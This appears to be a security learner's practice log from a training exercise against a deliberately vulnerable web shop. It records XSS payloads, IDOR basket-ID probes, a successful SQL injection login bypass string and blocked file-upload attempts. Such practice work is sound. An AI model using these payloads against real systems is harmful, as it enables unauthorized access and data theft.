# 🧪 Day 16 — Vulnerability Coverage

## 🔥 XSS Testing

### Payloads Tested

* `<img src=x onerror=alert(1)>`
* `"><img src=x onerror=alert(1)>`
* `<svg/onload=alert(1)>`

### Result

* All payloads executed
* DOM-based XSS confirmed
* No evidence of stored XSS

---

## 🔥 IDOR Testing

### Endpoints Tested

* `/rest/basket/3` → Accessible
* `/rest/basket/10` → 304
* `/rest/basket/999` → 304

### Result

* Unauthorized basket access confirmed
* Horizontal access possible

---

## 🔥 Authentication Testing

### Tests Performed

* Valid email + wrong password → 401
* SQL Injection (`admin' OR 1=1--`) → Login successful

### Result

* Authentication bypass via SQL Injection confirmed
* Critical severity

---

## 🟡 File Upload Testing

### Tests Performed

* `test.php.jpg` → Blocked
* `test.jpg.php` → Blocked
* MIME manipulation attempted

### Result

* No execution achieved
* File renaming enforced
* Upload considered secure

---

## 🧠 Key Takeaways

* Multiple vulnerability classes exist simultaneously
* SQL Injection represents highest impact
* IDOR allows data exposure
* Upload controls are effective
